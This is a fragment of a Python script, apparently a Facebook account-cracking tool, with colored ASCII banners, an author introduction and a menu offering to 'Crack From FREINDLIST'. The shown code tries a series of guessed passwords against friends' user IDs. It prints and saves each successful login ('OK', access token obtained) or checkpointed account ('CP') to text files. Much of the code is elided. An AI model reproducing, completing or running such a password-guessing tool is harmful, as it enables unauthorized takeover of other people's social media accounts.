...
try:
    ...
    os.system("python2 your Maxhar.py")
...
\033[1;93m  $$ |  $$ |$$\  \____$$\       
\033[1;93m$$$$$$\ \$$$$  |$$$$$$$  |      
\033[1;93m\______| \____/ \_______/
                
\033[1;93m$$$$$$\  $$\   $$\  $$$$$$\  $$\   $$\ $$$$$$$$\  $$$$$$\  
$$  __$$\ $$ |  $$ |$$  __$$\ $$$\  $$ |\__$$  __|$$  __$$\ 
$$ /  \__|$$ |  $$ |$$ /  $$ |$$$$\ $$ |   $$ |   $$ /  $$ |
\033[1;93m\$$$$$$\  $$$$$$$$ |$$$$$$$$ |$$ $$\$$ |   $$ |   $$ |  $$ |
\033[1;93m\____$$\ $$  __$$ |$$  __$$ |$$ \$$$$ |   $$ |   $$ |  $$ |
\033[1;93m$$\   $$ |$$ |  $$ |$$ |  $$ |$$ |\$$$ |   $$ |   $$ |  $$ |
\033[1;93m\$$$$$$  |$$ |  $$ |$$ |  $$ |$$ | \$$ |   $$ |    $$$$$$  |
\033[1;93m\______/ \__|  \__|\__|  \__|\__|  \__|   \__|    \______/

                    \033[1;96m My iNTroDuCTiON

\033[1;92m Hi I’m SHANtO AhMED

\033[1;94mI’m living in Naogaon

\033[1;93mI’m currently learning PYTHON
                         
\033[1;97mMy Religion is ISLAM
...
def main():
    ...
    print("\033[1;95m[2]\033[1;97mFOLLOW THE SHANTO ")
    ...
    print("\033[1;91m[0]\033[1;97mEXIT THE SHANTO")
...
def main_select():
    ...
    if SHANTO =="2":
        ...
        os.system("xdg-open https://www.facebook.com/mr.shantohridoy")
...
def menu():
    ...
    print("\033[1;97m[1]\033[1;92mCrack From FREINDLIST")
    ...
    print("\033[1;97m[0]\033[1;97mEXIT THE SHANTO")
...
def menu_select():
	...
	def main(arg):
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		        ...
		        print("\033[1;93m[SHANTO  CP] "+uid+" = "+pass1)

 

		        cp=open("shantocp.txt","a")
		    	...
		    	if "access_token" in d:
		            ...
		            print("\x1b[1;97m[SHANTO  OK] "+uid+" = "+pass1+"\x1b[1;0m")

 

		            ok=open("shantook.txt","a")
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                print("\033[1;93m[Mazhar  CP] "+uid+" = "+pass2)
		                ...
		                if 'access_token' in d:
		                    ...
		                    print("\x1b[1;97m[Mazhar OK] "+uid+" = "+pass2+"\x1b[1;0m")
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        print("\033[1;93m[Mazhar  CP] "+uid+" = "+pass3)
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            print("\x1b[1;97m[Mazhar  OK] "+uid+" = "+pass3+"\x1b[1;0m")
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                print("\033[1;93m[SHANTO  CP] "+uid+" = "+pass4)
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    print("\x1b[1;97m[SHANTO  OK] "+uid+" = "+pass4+"\x1b[1;0m")
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        print("\033[1;93m[SHANTO  OK] "+uid+" = "+pass5)
		                                        ...
		                                        if 'access_token' in d:
		                                            ...
		                                            print("\x1b[1;97m[SHANTO  OK] "+uid+" = "+pass5+"\x1b[1;0m")
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                print("\033[1;93m[SHANTO  CP] "+uid+" = "+pass6)
		                                                ...
		                                                if 'access_token' in d:
		                                                    ...
		                                                    print("\x1b[1;97m[SHANTO  OK] "+uid+" = "+pass6+"\x1b[1;0m")
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        print("\033[1;93m[Mazhar  OK] "+uid+" = "+pass7)
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            ...
		                                                            print("\x1b[1;97m[SHANTO   OK] "+uid+" = "+pass7+"\x1b[1;0m")
	...
	print ("[!] ALLAH  HAFIZ H4S94T Total Cp/Ok : "+str(len(cps)) + "/"+str(len(oks)))
